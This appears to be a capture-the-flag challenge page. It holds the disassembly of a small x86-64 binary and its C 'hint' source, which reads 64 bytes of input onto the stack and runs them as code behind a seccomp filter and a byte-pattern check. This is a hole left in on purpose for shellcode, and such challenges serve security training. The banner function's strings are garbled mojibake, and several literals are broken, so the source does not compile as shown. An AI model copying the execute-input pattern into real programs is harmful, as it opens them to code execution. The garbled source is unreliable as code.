  40115d:	48 83 e4 f0          	and    rsp,0xfffffffffffffff0
  401161:	50                   	push   rax
  401162:	54                   	push   rsp
  401163:	49 c7 c0 c0 16 40 00 	mov    r8,0x4016c0
  40116a:	48 c7 c1 50 16 40 00 	mov    rcx,0x401650
  401171:	48 c7 c7 f3 14 40 00 	mov    rdi,0x4014f3
  401178:	ff 15 72 4e 00 00    	call   QWORD PTR [rip+0x4e72]        # 405ff0 <__libc_start_main@GLIBC_2.2.5>
  40117e:	f4                   	hlt    
  40117f:	90                   	nop

0000000000401180 <_dl_relocate_static_pie>:
  401180:	f3 0f 1e fa          	endbr64 
  401184:	c3                   	ret    
  401185:	66 2e 0f 1f 84 00 00 	nop    WORD PTR cs:[rax+rax*1+0x0]
  40118c:	00 00 00 
  40118f:	90                   	nop

0000000000401190 <deregister_tm_clones>:
  401190:	b8 70 60 40 00       	mov    eax,0x406070
  401195:	48 3d 70 60 40 00    	cmp    rax,0x406070
  40119b:	74 13                	je     4011b0 <deregister_tm_clones+0x20>
  40119d:	b8 00 00 00 00       	mov    eax,0x0
  4011a2:	48 85 c0             	test   rax,rax
  4011a5:	74 09                	je     4011b0 <deregister_tm_clones+0x20>
  4011a7:	bf 70 60 40 00       	mov    edi,0x406070
  4011ac:	ff e0                	jmp    rax
  4011ae:	66 90                	xchg   ax,ax
  4011b0:	c3                   	ret    
  4011b1:	66 66 2e 0f 1f 84 00 	data16 nop WORD PTR cs:[rax+rax*1+0x0]
  4011b8:	00 00 00 00 
  4011bc:	0f 1f 40 00          	nop    DWORD PTR [rax+0x0]

00000000004011c0 <register_tm_clones>:
  4011c0:	be 70 60 40 00       	mov    esi,0x406070
  4011c5:	48 81 ee 70 60 40 00 	sub    rsi,0x406070
  4011cc:	48 89 f0             	mov    rax,rsi
  4011cf:	48 c1 ee 3f          	shr    rsi,0x3f
  4011d3:	48 c1 f8 03          	sar    rax,0x3
  4011d7:	48 01 c6             	add    rsi,rax
  4011da:	48 d1 fe             	sar    rsi,1
  4011dd:	74 11                	je     4011f0 <register_tm_clones+0x30>
  4011df:	b8 00 00 00 00       	mov    eax,0x0
  4011e4:	48 85 c0             	test   rax,rax
  4011e7:	74 07                	je     4011f0 <register_tm_clones+0x30>
  4011e9:	bf 70 60 40 00       	mov    edi,0x406070
  4011ee:	ff e0                	jmp    rax
  4011f0:	c3                   	ret    
  4011f1:	66 66 2e 0f 1f 84 00 	data16 nop WORD PTR cs:[rax+rax*1+0x0]
  4011f8:	00 00 00 00 
  4011fc:	0f 1f 40 00          	nop    DWORD PTR [rax+0x0]

0000000000401200 <__do_global_dtors_aux>:
  401200:	f3 0f 1e fa          	endbr64 
  401204:	80 3d 9d 4e 00 00 00 	cmp    BYTE PTR [rip+0x4e9d],0x0        # 4060a8 <completed.0>
  40120b:	75 13                	jne    401220 <__do_global_dtors_aux+0x20>
  40120d:	55                   	push   rbp
  40120e:	48 89 e5             	mov    rbp,rsp
  401211:	e8 7a ff ff ff       	call   401190 <deregister_tm_clones>
  401216:	c6 05 8b 4e 00 00 01 	mov    BYTE PTR [rip+0x4e8b],0x1        # 4060a8 <completed.0>
  40121d:	5d                   	pop    rbp
  40121e:	c3                   	ret    
  40121f:	90                   	nop
  401220:	c3                   	ret    
  401221:	66 66 2e 0f 1f 84 00 	data16 nop WORD PTR cs:[rax+rax*1+0x0]
  401228:	00 00 00 00 
  40122c:	0f 1f 40 00          	nop    DWORD PTR [rax+0x0]

0000000000401230 <frame_dummy>:
  401230:	f3 0f 1e fa          	endbr64 
  401234:	eb 8a                	jmp    4011c0 <register_tm_clones>

0000000000401236 <init>:
  401236:	f3 0f 1e fa          	endbr64 
  40123a:	55                   	push   rbp
  40123b:	48 89 e5             	mov    rbp,rsp
  40123e:	48 8b 05 4b 4e 00 00 	mov    rax,QWORD PTR [rip+0x4e4b]        # 406090 <stdin@@GLIBC_2.2.5>
  401245:	b9 00 00 00 00       	mov    ecx,0x0
  40124a:	ba 02 00 00 00       	mov    edx,0x2
  40124f:	be 00 00 00 00       	mov    esi,0x0
  401254:	48 89 c7             	mov    rdi,rax
  401257:	e8 c4 fe ff ff       	call   401120 <setvbuf@plt>
  40125c:	48 8b 05 1d 4e 00 00 	mov    rax,QWORD PTR [rip+0x4e1d]        # 406080 <stdout@@GLIBC_2.2.5>
  401263:	b9 00 00 00 00       	mov    ecx,0x0
  401268:	ba 02 00 00 00       	mov    edx,0x2
  40126d:	be 00 00 00 00       	mov    esi,0x0
  401272:	48 89 c7             	mov    rdi,rax
  401275:	e8 a6 fe ff ff       	call   401120 <setvbuf@plt>
  40127a:	48 8b 05 1f 4e 00 00 	mov    rax,QWORD PTR [rip+0x4e1f]        # 4060a0 <stderr@@GLIBC_2.2.5>
  401281:	b9 00 00 00 00       	mov    ecx,0x0
  401286:	ba 02 00 00 00       	mov    edx,0x2
  40128b:	be 00 00 00 00       	mov    esi,0x0
  401290:	48 89 c7             	mov    rdi,rax
  401293:	e8 88 fe ff ff       	call   401120 <setvbuf@plt>
  401298:	90                   	nop
  401299:	5d                   	pop    rbp
  40129a:	c3                   	ret    

000000000040129b <init_seccomp>:
  40129b:	f3 0f 1e fa          	endbr64 
  40129f:	55                   	push   rbp
  4012a0:	48 89 e5             	mov    rbp,rsp
  4012a3:	48 83 ec 10          	sub    rsp,0x10
  4012a7:	bf 00 00 00 00       	mov    edi,0x0
  4012ac:	e8 0f fe ff ff       	call   4010c0 <seccomp_init@plt>
  4012b1:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  4012b5:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  4012b9:	b9 00 00 00 00       	mov    ecx,0x0
  4012be:	ba 02 00 00 00       	mov    edx,0x2
  4012c3:	be 00 00 ff 7f       	mov    esi,0x7fff0000
  4012c8:	48 89 c7             	mov    rdi,rax
  4012cb:	b8 00 00 00 00       	mov    eax,0x0
  4012d0:	e8 0b fe ff ff       	call   4010e0 <seccomp_rule_add@plt>
  4012d5:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  4012d9:	b9 00 00 00 00       	mov    ecx,0x0
  4012de:	ba 00 00 00 00       	mov    edx,0x0
  4012e3:	be 00 00 ff 7f       	mov    esi,0x7fff0000
  4012e8:	48 89 c7             	mov    rdi,rax
  4012eb:	b8 00 00 00 00       	mov    eax,0x0
  4012f0:	e8 eb fd ff ff       	call   4010e0 <seccomp_rule_add@plt>
  4012f5:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  4012f9:	b9 00 00 00 00       	mov    ecx,0x0
  4012fe:	ba 3c 00 00 00       	mov    edx,0x3c
  401303:	be 00 00 ff 7f       	mov    esi,0x7fff0000
  401308:	48 89 c7             	mov    rdi,rax
  40130b:	b8 00 00 00 00       	mov    eax,0x0
  401310:	e8 cb fd ff ff       	call   4010e0 <seccomp_rule_add@plt>
  401315:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  401319:	b9 00 00 00 00       	mov    ecx,0x0
  40131e:	ba e7 00 00 00       	mov    edx,0xe7
  401323:	be 00 00 ff 7f       	mov    esi,0x7fff0000
  401328:	48 89 c7             	mov    rdi,rax
  40132b:	b8 00 00 00 00       	mov    eax,0x0
  401330:	e8 ab fd ff ff       	call   4010e0 <seccomp_rule_add@plt>
  401335:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  401339:	48 89 c7             	mov    rdi,rax
  40133c:	e8 bf fd ff ff       	call   401100 <seccomp_load@plt>
  401341:	90                   	nop
  401342:	c9                   	leave  
  401343:	c3                   	ret    

0000000000401344 <banner>:
  401344:	f3 0f 1e fa          	endbr64 
  401348:	55                   	push   rbp
  401349:	48 89 e5             	mov    rbp,rsp
  40134c:	48 8d 3d b5 0c 00 00 	lea    rdi,[rip+0xcb5]        # 402008 <_IO_stdin_used+0x8>
  401353:	e8 98 fd ff ff       	call   4010f0 <puts@plt>
  401358:	48 8d 3d 81 0d 00 00 	lea    rdi,[rip+0xd81]        # 4020e0 <_IO_stdin_used+0xe0>
  40135f:	e8 8c fd ff ff       	call   4010f0 <puts@plt>
  401364:	48 8d 3d 4d 0e 00 00 	lea    rdi,[rip+0xe4d]        # 4021b8 <_IO_stdin_used+0x1b8>
  40136b:	e8 80 fd ff ff       	call   4010f0 <puts@plt>
  401370:	48 8d 3d 19 0f 00 00 	lea    rdi,[rip+0xf19]        # 402290 <_IO_stdin_used+0x290>
  401377:	e8 74 fd ff ff       	call   4010f0 <puts@plt>
  40137c:	48 8d 3d e5 0f 00 00 	lea    rdi,[rip+0xfe5]        # 402368 <_IO_stdin_used+0x368>
  401383:	e8 68 fd ff ff       	call   4010f0 <puts@plt>
  401388:	48 8d 3d b1 10 00 00 	lea    rdi,[rip+0x10b1]        # 402440 <_IO_stdin_used+0x440>
  40138f:	e8 5c fd ff ff       	call   4010f0 <puts@plt>
  401394:	48 8d 3d 7d 11 00 00 	lea    rdi,[rip+0x117d]        # 402518 <_IO_stdin_used+0x518>
  40139b:	e8 50 fd ff ff       	call   4010f0 <puts@plt>
  4013a0:	48 8d 3d 49 12 00 00 	lea    rdi,[rip+0x1249]        # 4025f0 <_IO_stdin_used+0x5f0>
  4013a7:	e8 44 fd ff ff       	call   4010f0 <puts@plt>
  4013ac:	48 8d 3d 15 13 00 00 	lea    rdi,[rip+0x1315]        # 4026c8 <_IO_stdin_used+0x6c8>
  4013b3:	e8 38 fd ff ff       	call   4010f0 <puts@plt>
  4013b8:	48 8d 3d e1 13 00 00 	lea    rdi,[rip+0x13e1]        # 4027a0 <_IO_stdin_used+0x7a0>
  4013bf:	e8 2c fd ff ff       	call   4010f0 <puts@plt>
  4013c4:	48 8d 3d ad 14 00 00 	lea    rdi,[rip+0x14ad]        # 402878 <_IO_stdin_used+0x878>
  4013cb:	e8 20 fd ff ff       	call   4010f0 <puts@plt>
  4013d0:	48 8d 3d 79 15 00 00 	lea    rdi,[rip+0x1579]        # 402950 <_IO_stdin_used+0x950>
  4013d7:	e8 14 fd ff ff       	call   4010f0 <puts@plt>
  4013dc:	48 8d 3d 45 16 00 00 	lea    rdi,[rip+0x1645]        # 402a28 <_IO_stdin_used+0xa28>
  4013e3:	e8 08 fd ff ff       	call   4010f0 <puts@plt>
  4013e8:	48 8d 3d 11 17 00 00 	lea    rdi,[rip+0x1711]        # 402b00 <_IO_stdin_used+0xb00>
  4013ef:	e8 fc fc ff ff       	call   4010f0 <puts@plt>
  4013f4:	48 8d 3d dd 17 00 00 	lea    rdi,[rip+0x17dd]        # 402bd8 <_IO_stdin_used+0xbd8>
  4013fb:	e8 f0 fc ff ff       	call   4010f0 <puts@plt>
  401400:	48 8d 3d a9 18 00 00 	lea    rdi,[rip+0x18a9]        # 402cb0 <_IO_stdin_used+0xcb0>
  401407:	e8 e4 fc ff ff       	call   4010f0 <puts@plt>
  40140c:	48 8d 3d 75 19 00 00 	lea    rdi,[rip+0x1975]        # 402d88 <_IO_stdin_used+0xd88>
  401413:	e8 d8 fc ff ff       	call   4010f0 <puts@plt>
  401418:	48 8d 3d 41 1a 00 00 	lea    rdi,[rip+0x1a41]        # 402e60 <_IO_stdin_used+0xe60>
  40141f:	e8 cc fc ff ff       	call   4010f0 <puts@plt>
  401424:	48 8d 3d 0d 1b 00 00 	lea    rdi,[rip+0x1b0d]        # 402f38 <_IO_stdin_used+0xf38>
  40142b:	e8 c0 fc ff ff       	call   4010f0 <puts@plt>
  401430:	48 8d 3d d9 1b 00 00 	lea    rdi,[rip+0x1bd9]        # 403010 <_IO_stdin_used+0x1010>
  401437:	e8 b4 fc ff ff       	call   4010f0 <puts@plt>
  40143c:	48 8d 3d a5 1c 00 00 	lea    rdi,[rip+0x1ca5]        # 4030e8 <_IO_stdin_used+0x10e8>
  401443:	e8 a8 fc ff ff       	call   4010f0 <puts@plt>
  401448:	48 8d 3d 71 1d 00 00 	lea    rdi,[rip+0x1d71]        # 4031c0 <_IO_stdin_used+0x11c0>
  40144f:	e8 9c fc ff ff       	call   4010f0 <puts@plt>
  401454:	48 8d 3d 3d 1e 00 00 	lea    rdi,[rip+0x1e3d]        # 403298 <_IO_stdin_used+0x1298>
  40145b:	e8 90 fc ff ff       	call   4010f0 <puts@plt>
  401460:	48 8d 3d 09 1f 00 00 	lea    rdi,[rip+0x1f09]        # 403370 <_IO_stdin_used+0x1370>
  401467:	e8 84 fc ff ff       	call   4010f0 <puts@plt>
  40146c:	48 8d 3d d5 1f 00 00 	lea    rdi,[rip+0x1fd5]        # 403448 <_IO_stdin_used+0x1448>
  401473:	e8 78 fc ff ff       	call   4010f0 <puts@plt>
  401478:	48 8d 3d a1 20 00 00 	lea    rdi,[rip+0x20a1]        # 403520 <_IO_stdin_used+0x1520>
  40147f:	e8 6c fc ff ff       	call   4010f0 <puts@plt>
  401484:	48 8d 3d 6d 21 00 00 	lea    rdi,[rip+0x216d]        # 4035f8 <_IO_stdin_used+0x15f8>
  40148b:	e8 60 fc ff ff       	call   4010f0 <puts@plt>
  401490:	48 8d 3d 39 22 00 00 	lea    rdi,[rip+0x2239]        # 4036d0 <_IO_stdin_used+0x16d0>
  401497:	e8 54 fc ff ff       	call   4010f0 <puts@plt>
  40149c:	48 8d 3d 05 23 00 00 	lea    rdi,[rip+0x2305]        # 4037a8 <_IO_stdin_used+0x17a8>
  4014a3:	e8 48 fc ff ff       	call   4010f0 <puts@plt>
  4014a8:	48 8d 3d d1 23 00 00 	lea    rdi,[rip+0x23d1]        # 403880 <_IO_stdin_used+0x1880>
  4014af:	e8 3c fc ff ff       	call   4010f0 <puts@plt>
  4014b4:	48 8d 3d 9d 24 00 00 	lea    rdi,[rip+0x249d]        # 403958 <_IO_stdin_used+0x1958>
  4014bb:	e8 30 fc ff ff       	call   4010f0 <puts@plt>
  4014c0:	48 8d 3d 69 25 00 00 	lea    rdi,[rip+0x2569]        # 403a30 <_IO_stdin_used+0x1a30>
  4014c7:	e8 24 fc ff ff       	call   4010f0 <puts@plt>
  4014cc:	48 8d 3d 35 26 00 00 	lea    rdi,[rip+0x2635]        # 403b08 <_IO_stdin_used+0x1b08>
  4014d3:	e8 18 fc ff ff       	call   4010f0 <puts@plt>
  4014d8:	48 8d 3d 01 27 00 00 	lea    rdi,[rip+0x2701]        # 403be0 <_IO_stdin_used+0x1be0>
  4014df:	e8 0c fc ff ff       	call   4010f0 <puts@plt>
  4014e4:	48 8d 3d cd 27 00 00 	lea    rdi,[rip+0x27cd]        # 403cb8 <_IO_stdin_used+0x1cb8>
  4014eb:	e8 00 fc ff ff       	call   4010f0 <puts@plt>
  4014f0:	90                   	nop
  4014f1:	5d                   	pop    rbp
  4014f2:	c3                   	ret    

00000000004014f3 <main>:
  4014f3:	f3 0f 1e fa          	endbr64 
  4014f7:	55                   	push   rbp
  4014f8:	48 89 e5             	mov    rbp,rsp
  4014fb:	48 83 ec 60          	sub    rsp,0x60
  4014ff:	b8 00 00 00 00       	mov    eax,0x0
  401504:	e8 2d fd ff ff       	call   401236 <init>
  401509:	b8 00 00 00 00       	mov    eax,0x0
  40150e:	e8 31 fe ff ff       	call   401344 <banner>
  401513:	48 b8 70 65 6b 6f 70 	movabs rax,0x6f6b65706f6b6570
  40151a:	65 6b 6f 
  40151d:	48 ba 70 65 6b 6f 70 	movabs rdx,0x6f6b65706f6b6570
  401524:	65 6b 6f 
  401527:	48 89 45 a0          	mov    QWORD PTR [rbp-0x60],rax
  40152b:	48 89 55 a8          	mov    QWORD PTR [rbp-0x58],rdx
  40152f:	48 89 45 b0          	mov    QWORD PTR [rbp-0x50],rax
  401533:	48 89 55 b8          	mov    QWORD PTR [rbp-0x48],rdx
  401537:	48 89 45 c0          	mov    QWORD PTR [rbp-0x40],rax
  40153b:	48 89 55 c8          	mov    QWORD PTR [rbp-0x38],rdx
  40153f:	48 89 45 d0          	mov    QWORD PTR [rbp-0x30],rax
  401543:	48 89 55 d8          	mov    QWORD PTR [rbp-0x28],rdx
  401547:	c6 45 e0 00          	mov    BYTE PTR [rbp-0x20],0x0
  40154b:	48 8d 3d 3e 28 00 00 	lea    rdi,[rip+0x283e]        # 403d90 <_IO_stdin_used+0x1d90>
  401552:	e8 99 fb ff ff       	call   4010f0 <puts@plt>
  401557:	48 8d 45 ec          	lea    rax,[rbp-0x14]
  40155b:	48 89 c6             	mov    rsi,rax
  40155e:	48 8d 3d 58 28 00 00 	lea    rdi,[rip+0x2858]        # 403dbd <_IO_stdin_used+0x1dbd>
  401565:	b8 00 00 00 00       	mov    eax,0x0
  40156a:	e8 c1 fb ff ff       	call   401130 <__isoc99_scanf@plt>
  40156f:	48 8d 45 ec          	lea    rax,[rbp-0x14]
  401573:	ba 03 00 00 00       	mov    edx,0x3
  401578:	48 8d 35 42 28 00 00 	lea    rsi,[rip+0x2842]        # 403dc1 <_IO_stdin_used+0x1dc1>
  40157f:	48 89 c7             	mov    rdi,rax
  401582:	e8 49 fb ff ff       	call   4010d0 <strncmp@plt>
  401587:	85 c0                	test   eax,eax
  401589:	74 16                	je     4015a1 <main+0xae>
  40158b:	48 8d 3d 33 28 00 00 	lea    rdi,[rip+0x2833]        # 403dc5 <_IO_stdin_used+0x1dc5>
  401592:	e8 59 fb ff ff       	call   4010f0 <puts@plt>
  401597:	bf 00 00 00 00       	mov    edi,0x0
  40159c:	e8 9f fb ff ff       	call   401140 <exit@plt>
  4015a1:	48 8d 3d 2a 28 00 00 	lea    rdi,[rip+0x282a]        # 403dd2 <_IO_stdin_used+0x1dd2>
  4015a8:	e8 43 fb ff ff       	call   4010f0 <puts@plt>
  4015ad:	b8 00 00 00 00       	mov    eax,0x0
  4015b2:	e8 e4 fc ff ff       	call   40129b <init_seccomp>
  4015b7:	48 8d 45 a0          	lea    rax,[rbp-0x60]
  4015bb:	ba 40 00 00 00       	mov    edx,0x40
  4015c0:	48 89 c6             	mov    rsi,rax
  4015c3:	bf 00 00 00 00       	mov    edi,0x0
  4015c8:	b8 00 00 00 00       	mov    eax,0x0
  4015cd:	e8 3e fb ff ff       	call   401110 <read@plt>
  4015d2:	c7 45 fc 00 00 00 00 	mov    DWORD PTR [rbp-0x4],0x0
  4015d9:	eb 4c                	jmp    401627 <main+0x134>
  4015db:	8b 4d fc             	mov    ecx,DWORD PTR [rbp-0x4]
  4015de:	48 63 c1             	movsxd rax,ecx
  4015e1:	48 69 c0 e9 a2 8b 2e 	imul   rax,rax,0x2e8ba2e9
  4015e8:	48 c1 e8 20          	shr    rax,0x20
  4015ec:	d1 f8                	sar    eax,1
  4015ee:	89 ce                	mov    esi,ecx
  4015f0:	c1 fe 1f             	sar    esi,0x1f
  4015f3:	29 f0                	sub    eax,esi
  4015f5:	89 c2                	mov    edx,eax
  4015f7:	89 d0                	mov    eax,edx
  4015f9:	c1 e0 02             	shl    eax,0x2
  4015fc:	01 d0                	add    eax,edx
  4015fe:	01 c0                	add    eax,eax
  401600:	01 d0                	add    eax,edx
  401602:	29 c1                	sub    ecx,eax
  401604:	89 ca                	mov    edx,ecx
  401606:	83 fa 05             	cmp    edx,0x5
  401609:	75 18                	jne    401623 <main+0x130>
  40160b:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  40160e:	48 98                	cdqe   
  401610:	0f b6 44 05 a0       	movzx  eax,BYTE PTR [rbp+rax*1-0x60]
  401615:	3c 87                	cmp    al,0x87
  401617:	74 0a                	je     401623 <main+0x130>
  401619:	bf 00 00 00 00       	mov    edi,0x0
  40161e:	e8 1d fb ff ff       	call   401140 <exit@plt>
  401623:	83 45 fc 01          	add    DWORD PTR [rbp-0x4],0x1
  401627:	83 7d fc 3f          	cmp    DWORD PTR [rbp-0x4],0x3f
  40162b:	7e ae                	jle    4015db <main+0xe8>
  40162d:	48 8d 45 a0          	lea    rax,[rbp-0x60]
  401631:	48 89 45 f0          	mov    QWORD PTR [rbp-0x10],rax
  401635:	48 8b 55 f0          	mov    rdx,QWORD PTR [rbp-0x10]
  401639:	b8 00 00 00 00       	mov    eax,0x0
  40163e:	ff d2                	call   rdx
  401640:	b8 00 00 00 00       	mov    eax,0x0
  401645:	c9                   	leave  
  401646:	c3                   	ret    
  401647:	66 0f 1f 84 00 00 00 	nop    WORD PTR [rax+rax*1+0x0]
  40164e:	00 00 

0000000000401650 <__libc_csu_init>:
  401650:	f3 0f 1e fa          	endbr64 
  401654:	41 57                	push   r15
  401656:	4c 8d 3d a3 47 00 00 	lea    r15,[rip+0x47a3]        # 405e00 <__frame_dummy_init_array_entry>
  40165d:	41 56                	push   r14
  40165f:	49 89 d6             	mov    r14,rdx
  401662:	41 55                	push   r13
  401664:	49 89 f5             	mov    r13,rsi
  401667:	41 54                	push   r12
  401669:	41 89 fc             	mov    r12d,edi
  40166c:	55                   	push   rbp
  40166d:	48 8d 2d 94 47 00 00 	lea    rbp,[rip+0x4794]        # 405e08 <__do_global_dtors_aux_fini_array_entry>
  401674:	53                   	push   rbx
  401675:	4c 29 fd             	sub    rbp,r15
  401678:	48 83 ec 08          	sub    rsp,0x8
  40167c:	e8 7f f9 ff ff       	call   401000 <_init>
  401681:	48 c1 fd 03          	sar    rbp,0x3
  401685:	74 1f                	je     4016a6 <__libc_csu_init+0x56>
  401687:	31 db                	xor    ebx,ebx
  401689:	0f 1f 80 00 00 00 00 	nop    DWORD PTR [rax+0x0]
  401690:	4c 89 f2             	mov    rdx,r14
  401693:	4c 89 ee             	mov    rsi,r13
  401696:	44 89 e7             	mov    edi,r12d
  401699:	41 ff 14 df          	call   QWORD PTR [r15+rbx*8]
  40169d:	48 83 c3 01          	add    rbx,0x1
  4016a1:	48 39 dd             	cmp    rbp,rbx
  4016a4:	75 ea                	jne    401690 <__libc_csu_init+0x40>
  4016a6:	48 83 c4 08          	add    rsp,0x8
  4016aa:	5b                   	pop    rbx
  4016ab:	5d                   	pop    rbp
  4016ac:	41 5c                	pop    r12
  4016ae:	41 5d                	pop    r13
  4016b0:	41 5e                	pop    r14
  4016b2:	41 5f                	pop    r15
  4016b4:	c3                   	ret    
  4016b5:	66 66 2e 0f 1f 84 00 	data16 nop WORD PTR cs:[rax+rax*1+0x0]
  4016bc:	00 00 00 00 

00000000004016c0 <__libc_csu_fini>:
  4016c0:	f3 0f 1e fa          	endbr64 
  4016c4:	c3                   	ret    

Disassembly of section .fini:

00000000004016c8 <_fini>:
  4016c8:	f3 0f 1e fa          	endbr64 
  4016cc:	48 83 ec 08          	sub    rsp,0x8
  4016d0:	48 83 c4 08          	add    rsp,0x8
  4016d4:	c3                   	ret    

```

</details>
<details><summary>hint code</summary>

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <time.h>
#include <seccomp.h>
#include <linux/seccomp.h>

void init()
{
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);
	return;
}

void init_seccomp()
{
	scmp_filter_ctx ctx;
	ctx = seccomp_init(SCMP_ACT_KILL);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);
	seccomp_load(ctx);
}

void banner()
{
	puts("漶Ⅰ滹踱▼????????????????????滹踱ˋ??滹踱ˋ滹踱ˋ??????????????漶??˙滹踱ˋ滹踱ˋ????滹踱ˋ?????????Ⅲ");
	puts("滹猾ˇ滹踱??????????????????????詹ˋ滹猾????潳嫖???滹?????????滹詹??潳ˋ滹踱ˋ??滹潑ㄓ滹手ˉ滹踱??????????潳?);
	puts("滹踱ˋ滹踱???????????????????潳滹??潳抽?漶?滹潑???????????漶潳??潳滹撾ˋ漶踱?滹ˋ滹踱ˋ滹踱ˋ滹踱ㄦ漶????????潳?);
	puts("滹踱ˋ滹踱▼???????????????滹?手??????潳嫖▼?????????????????潳??潳徉﹞?Ⅶ滹踱ˋ滹踱ˋ滹踱ˋ漶踱?????????潳?);
	puts("漶???????????????潳漶手???????潳漶氯???漶???潳???漶?????????潳????????????????????潳?);
	puts("漶?????????????潳漶氯???????潳漶撾???潳漶撾???????????????????潳Ｔ???????????????????潳?);
	puts("漶????????潳ㄥ漶?滹氯???????潳滹氯▼??潳滹??????????漶???????????????????????????滹氯??潳?);
	puts("漶?????????詹ˋ滹踱ˋ滹乒????滹滹滹手ˋ滹踱ㄠ??滹撾?滹?滹??????潳??????????潳喇?????????????????滹踱ˋ漶９");
	puts("漶????????滹ˋ滹踱ˋ滹踱ㄦ滹嗯ˋ?踱Ⅶ滹踱ˋ滹踱ˋ滹踱?滹潑ˋ滹踱ˋ滹踱????潳’?滹潑???????????ㄖ??潳﹦??????????????詹ˋ滹猾ˇ");
	puts("漶??滹ㄣ滹嗯ㄥ滹嗯ㄥ滹踱ˋ滹踱ˋ滹踱ˋ滹撾ˋ滹踱ˋ滹踱ˋ滹踱ˋ滹踱ˋ滹踱ˋ滹踱ˋ滹踱ㄦ滹色??滹詹?潳滹踱ˋ漶?滹踱????漶?滹漶?滹詹?????????????滹撾ˋ滹踱ˋ");
	puts("漶?滹ㄤ漶踱?滹踱ˋ滹踱ˋ滹踱ˋ滹踱ˋ滹踱▼?踱ˋ滹踱ˋ滹踱ˋ滹踱ˋ滹踱ˋ滹踱ˋ滹踱▼?喇??９漶?滹撾?滹踱ㄖ?潳詹?滹??潳喇?潳領?滹踱ˋ滹踱ˋ????????????潳踱ˋ滹踱ˋ");
	puts("滹把?滹氯??潳詹ˋ滹踱???????潳售ˋ滹踱ˋ潳領ˋ滹踱ˋ滹踱??╮漶踱?潳?潳聆??ㄓ??滹踱ˋ??ˋ?嫖ㄖ?潳詹?滹詹ˇ滹踱ˋ?Ⅲ漶??????????????Ⅲ");
	puts("滹踱ˋ???滹踱ˋ滹踱ˋ滹嗯ㄕ滹氯ㄣ滹嗯ㄓ滹嗯ˇ?９滹踱?滹踱Ⅰ漶???滹詹?漶?潳?潳滹售ˋ漶?潳踱Ⅲ??潳詹?滹猾??ˋ潳踱ˋ滹踱ˋ?潳ㄖ??????????????潳?);
	puts("滹踱???潳ˋ滹踱ˋ滹踱ˋ滹踱▼?踱?滹踱?滹踱?潳?潳詹?漶??滹踱ˋ????滹撾????潳詹ˉ漶??詹?潳詹??滹詹?滹踱ˋ滹踱ㄣ滹踱ˋ???潳ㄣ漶????????潳?);
	puts("滹踱ㄓ滹?漶撾??嫖ˋ滹踱ˋ滹踱ˋ滹踱ㄦ滹嗯ˉ漶９滹踱?潳詹?潳詹ˋ???滹踱ㄔ滹撾ㄞ漶潑???????詹?潳猾??潳領＆??滹嫖?漶ˋ滹踱ˋ滹踱ˋ???滹踱ˋ?????????潳?);
	puts("滹踱▼滹?▽???潳嫖ˋ滹踱ˋ滹踱ˋ滹踱ˋ滹踱?滹撾ˋ漶ˇ??ˋ漶????????Ｔ═漶????滹猾漶???漶?潳詹?滹?滹踱ˋ滹踱Ⅶ?猾’滹潑ˋ漶?????????潳?);
	puts("滹踱ˇ滹踱滹嗯ㄥ?色潳踱ˋ滹踱ˋ滹踱ㄝ漶Ⅶ漶?滹?漶踱??潳踱ˋ滹?滹猾ㄥ?撾潳踱ㄥ滹色???????潳踱??潳嫖ㄦ?潳領９滹踱?滹踱??９漶???嫖ㄦ漶????????潳?);
	puts("滹踱?滹手ㄥ漶踱?????嫖ˋ滹踱ˋ滹踱ˋ滹踱ㄦ滹踱ˋ滹踱??潳滹砂ˋ?領??????????????????嗯潳賤?漶９漶踱?漶??滹詹????滹踱?????????潳?);
	puts("滹踱▼??滹售??????嫖ˋ滹踱ˋ滹踱ˋ滹踱ˋ滹踱ˋ漶?潳詹９滹賤?滹嫖ㄖ漶??????????????撾８滹色???ㄧ?ˉ???滹踱????潳詹?????????潳?);
	puts("滹踱ˋ滹踱▼????????ˋ滹踱ˋ滹踱ˋ滹踱ˋ滹踱????詹???領Ⅶ漶踱????????????????Ⅲ滹色?漶?漶???滹踱????潳詹??潳手?????潳?);
	puts("漶踱????????潳ㄥ漶?潳踱ˋ滹踱ˋ滹踱ˋ滹踱???潳漶??????????????????滹??潳▼滹ˋ漶??滹售ˋ????潳詹ˋ????滹嗯ㄥ滹手ˉ");
	puts("漶?????????ˋ滹踱???領ˋ滹踱ˋ滹踱ˋ???潳詹?????????滹潑ˋ滹色???????滹踱◎潳滹撾ˋ漶踱ㄢ??漶ˋ滹踱????滹踱ˋ漶?????ˋ滹踱ˋ");
	puts("漶?????????潳領ˋ滹把ㄓ滹手ˋ滹踱ˋ滹踱ˋ潳?潳氯Ⅱ滹????????潳踱ˋ滹踱ˋ滹踱ㄦ滹踱?????滹詹ˋ????潳詹２?潳猾?滹ˇ滹踱ˋ漶１漶???滹踱ˋ滹?);
	puts("漶????????潳ˋ滹踱ˋ滹踱ˋ滹踱ˋ滹踱Ⅶ滹踱ˋ滹踱ˋ滹撾ˋ滹猾??????????踱Ⅶ漶踱?????潳售ˋ漶????滹踱??潳滹氯ˋ滹踱ˋ滹踱ˋ漶９滹???滹踱ˋ滹?);
	puts("漶?????????詹ˋ滹踱ˋ滹踱ˋ滹踱ˋ滹踱?滹踱ˋ滹踱ˋ滹踱ˋ滹踱ˋ滹猾ㄕ漶????????????潳滹手ˋ滹踱?滹??潳滹踱?滹氯ˋ滹踱ˋ滹踱ˋ滹踱ˋ?９滹踱???滹踱ˋ滹?);
